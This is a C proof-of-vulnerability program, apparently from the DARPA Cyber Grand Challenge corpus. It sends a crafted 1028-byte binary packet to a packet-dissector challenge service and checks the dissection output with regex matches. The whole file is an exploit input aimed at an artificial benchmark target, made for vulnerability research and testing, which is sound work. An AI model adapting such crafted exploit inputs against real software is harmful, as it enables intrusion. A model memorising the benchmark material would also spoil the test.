#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x18\xc2\x67\x7d"
         "\x03\xf4\xae\x07\x12\x7b\x99\x74\x72\xdd\x8c\xc2\x93\x3f\xd0\xb7"
         "\xcb\x01\x00\x00\x40\x00\x9e\xc9\x16\x00\x40\x00\x40\x40\x00\xf3"
         "\xc6\x50\x55\xc3\x0a\xe9\x13\xad\xda\xbe\x91\xd3\x1e\x55\x4a\x40"
         "\xad\xef\x7e\x08\x09\x0d\xbd\x3b\x56\x06\x8a\x6b\xbf\x83\x63\x96"
         "\x59\x7c\xc2\x0e\xa9\xaa\x8a\xc7\xba\x5a\x3d\xe0\xd2\xde\x00\xe5"
         "\x6e\xa9\x38\xb7\x0e\x1b\x40\x24\x96\x75\xb9\x8a\x5e\x72\x54\x6a"
         "\xab\x87\x03\x02\xa1\xa0\xd5\x7f\xc6\xa4\x01\x7d\x53\x41\xe1\x63"
         "\xd7\xdb\x99\xb6\xbf\xcf\xf3\xac\x34\x6b\xb0\x6f\xb2\x0f\xe2\xa6"
         "\x8f\xb3\x5d\xa4\x3d\xcc\x99\xc7\x05\x81\x37\xa0\x00\x54\xb6\x42"
         "\xf3\xfc\x10\xba\x22\x55\x76\x1b\x40\xfa\x3a\x8c\x49\x17\x49\xfd"
         "\xa2\xda\x03\x64\x19\xb2\x1c\x65\x08\xdc\xcb\x39\xc3\x44\xdf\x2d"
         "\x47\x8e\xc6\xc0\xf2\x17\x23\x11\xe3\x6c\x21\x70\x58\xa9\xcd\xfd"
         "\x0b\x6f\x3c\xe1\xe6\x18\x2b\x71\x0b\x45\xf4\x4b\x70\x9f\x8b\x42"
         "\x9a\x4d\x4a\x01\x40\xcd\xce\x07\x66\xfa\xa0\xe4\x7d\x3c\xed\xa8"
         "\xea\x32\x88\xf7\xc7\x6b\x94\x7c\x16\x45\xba\x66\x9a\xbd\x13\xa7"
         "\x66\x72\x01\x78\x3a\x76\xfb\x79\x91\xe8\xcc\x20\x6e\xff\x3b\x44"
         "\xfd\x31\xde\x10\xe0\x99\x62\x0d\x5c\xac\x79\xd3\x68\xbc\x59\xee"
         "\xc7\x8e\xcd\xdb\x9d\xf7\x96\x5a\x83\x43\x2d\x85\x6f\x43\x3f\x7a"
         "\x96\x08\x3a\xf6\xec\x1e\x9b\xd7\xc3\xad\xfa\x60\x41\x7e\x13\x62"
         "\xe3\x9d\x8a\xaf\xcc\x1d\x64\x40\x6c\x7e\x7b\x16\x7e\xd6\x79\x2c"
         "\xf1\xe8\xb5\x0a\x67\x3a\xea\xf9\xd0\x03\xbf\x63\x26\xd4\x8f\x31"
         "\x5b\x8f\xb8\xb4\x38\x6e\x59\xbb\x22\x3f\x23\x51\x50\x45\xde\x50"
         "\x88\x8b\x4c\x88\x0c\x4b\x90\x0d\xf6\x80\xc7\x17\x34\x7b\x7a\x99"
         "\x9b\xe7\xe6\x2a\x0f\x0f\x74\x53\x6f\x52\x81\x08\x6f\x52\xa2\x75"
         "\xd8\x34\x9d\xcb\x54\x27\x75\x5d\xbd\x81\x64\xd5\x71\x66\x39\x45"
         "\xb8\xcf\xbf\x17\x99\xf7\xac\xf5\x87\xfa\x33\xeb\x61\x96\x97\x19"
         "\x8f\x44\x61\xb7\xb7\x35\x3e\xc2\x29\xeb\xcd\x8a\x2f\xde\xd2\x49"
         "\x5f\x29\x3e\x7f\x3c\x6b\x27\xf5\xe1\x92\x5a\x40\x00\x40\x40\x00"
         "\xcd\x04\x19\xd9\xed\x31\x2a\x61\x40\xc7\x09\x96\x30\xba\x44\x72"
         "\x01\x88\xe2\x08\x79\x06\xdd\xe7\xfa\x06\x69\xe6\x38\x76\x7b\x75"
         "\x18\xe1\xd8\x64\x85\xca\x13\x66\x03\x04\x29\xce\x37\x1a\x09\xdc"
         "\x31\x4b\x90\x6d\x44\x7b\xb7\xed\x3e\xf6\x0a\x6e\xbc\xdc\xfe\xb8"
         "\x50\x47\xde\x89\x05\xa1\xc2\xa9\xf2\x3f\x5e\x96\x38\xdb\x29\xa3"
         "\x9f\xf5\x18\x40\x00\xac\x40\x59\xd2\x66\x12\x99\x85\xb3\x64\xf0"
         "\xf0\x40\xfb\xb1\x01\x90\x64\x9f\x7c\xc0\x5c\xcb\x69\x64\xcd\x6c"
         "\xf1\x05\x34\xe4\x1d\x2f\xbe\x34\xd0\x87\x3b\xc2\x4d\xf6\x32\x43"
         "\xb0\x6f\x20\x4d\x30\xb9\xec\x52\xc5\xe3\xee\x49\x60\xbb\xfb\x16"
         "\x52\x50\x90\x30\x06\x2e\xa7\xa1\x19\xc6\xba\xcf\x85\xb7\x87\x28"
         "\x01\x76\xc9\x06\xe9\x21\x7b\x25\x2a\x70\x99\x71\xf0\x54\x5c\x34"
         "\xe2\x2c\x5f\xd8\xdf\x71\x55\x32\x95\x43\x7a\x02\x27\x9b\x79\xf4"
         "\x73\x1b\x31\xc7\x7b\x40\xa9\xa4\xed\xd4\xd2\x74\xbb\x6f\x66\x35"
         "\xe5\xe9\x75\xd3\xc9\xc5\x1e\xaf\x9f\x0b\xb6\x91\x06\x17\x29\x31"
         "\x52\x5c\x28\x9f\xa1\xeb\x43\x19\x76\x7e\xa4\x86\x25\x91\xea\x13"
         "\x9a\xac\xc8\x0d\x2d\x68\x3a\x37\xb1\x10\x68\x48\x99\x00\x20\x1d"
         "\xf2\x74\x93\xea\x3a\x1a\x16\x52\xc8\xcf\x54\x62\xad\x5e\xf9\x81"
         "\xa8\x9a\xac\x04\xef\x1f\xbb\x0c\xef\x15\xc8\x87\x87\xc0\x1b\xf0"
         "\xb6\x84\x3c\x7b\x01\xb7\x30\xd9\x8d\xad\xd2\x0c\x57\xdf\x71\xf3"
         "\x4d\x93\x86\xe2\x17\xb8\xf1\xb1\xff\xe7\xbb\xe3\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===unexchangedsupraventricular
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x75\x6e\x65\x78\x63\x68\x61\x6e\x67\x65\x64"
         "\x73\x75\x70\x72\x61\x76\x65\x6e\x74\x72\x69\x63\x75\x6c\x61\x72";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
